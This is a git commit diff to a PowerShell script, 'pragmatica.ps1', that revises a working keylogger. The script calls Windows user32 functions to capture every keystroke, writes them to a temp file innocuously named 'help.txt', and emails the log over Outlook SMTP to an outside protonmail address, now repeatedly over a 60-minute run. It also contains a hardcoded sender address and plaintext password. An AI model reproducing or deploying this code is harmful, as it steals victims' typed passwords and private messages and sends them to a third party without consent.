bf14da2a6230dcae9f5249287830e313dee85853
cLohan <82850047+cLohan@users.noreply.github.com>
2024-05-26 13:05:18 -0300

    Update pragmatica.ps1

--- pragmatica.ps1
+++ pragmatica.ps1
@@ -1,22 +1,15 @@
-$TimesToRun = 0.5
-$RunTimeP = 0.5	# Time in minutes
+$MaxRunTimeMinutes = 60    # Tempo máximo de execução em minutos
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
 $Subject = "pragmatica"
 $body = "report"
-$SMTPServer = "smtp-mail.outlook.com"	# Outlook SMTP
+$SMTPServer = "smtp-mail.outlook.com"    # Servidor SMTP do Outlook
 $SMTPPort = "587"
-$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-############################
+$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
-$TimeStart = Get-Date
-$TimeEnd = $timeStart.addminutes($RunTimeP)
-
-#requires -Version 2
-function Start-Helper($Path="$env:temp\help.txt") 
-{
-  $signatures = @'
+function Start-Helper($Path="$env:temp\help.txt") {
+    $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -27,48 +20,39 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-  $null = New-Item -Path $Path -ItemType File -Force
+    $TimeStart = Get-Date
+    $TimeEnd = $TimeStart.AddMinutes($MaxRunTimeMinutes)
 
-  try
-  {
-
-    $Runner = 0
-	while ($TimesToRun  -ge $Runner) {
-	while ($TimeEnd -ge $TimeNow) {
-      Start-Sleep -Milliseconds 40
-      
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        $state = $API::GetAsyncKeyState($ascii)
-
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
-
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-          if ($success) 
-          {
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-          }
+    while ($TimeEnd -ge (Get-Date)) {
+        for ($ascii = 9; $ascii -le 254; $ascii++) {
+            $state = $API::GetAsyncKeyState($ascii)
+            if ($state -eq -32767) {
+                $null = [console]::CapsLock
+                $virtualKey = $API::MapVirtualKey($ascii, 3)
+                $kbstate = New-Object Byte[] 256
+                $checkkbstate = $API::GetKeyboardState($kbstate)
+                $mychar = New-Object -TypeName System.Text.StringBuilder
+                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                if ($success) {
+                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                }
+            }
         }
-      }
-	  $TimeNow = Get-Date
+
+        # Verifica se é hora de enviar o log
+        $currentTime = Get-Date
+        if ($currentTime.Second % 30 -eq 0) {
+            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+        }
+
+        # Aguarda 30 segundos antes de continuar
+        Start-Sleep -Seconds 30
     }
-	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
-	Remove-Item -Path $Path -force
-	}
-  }
-  finally
-  {
-	exit 1
-  }
+
+    # Após o término do tempo de execução, envia o log final
+    Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
 }
+
 Start-Helper
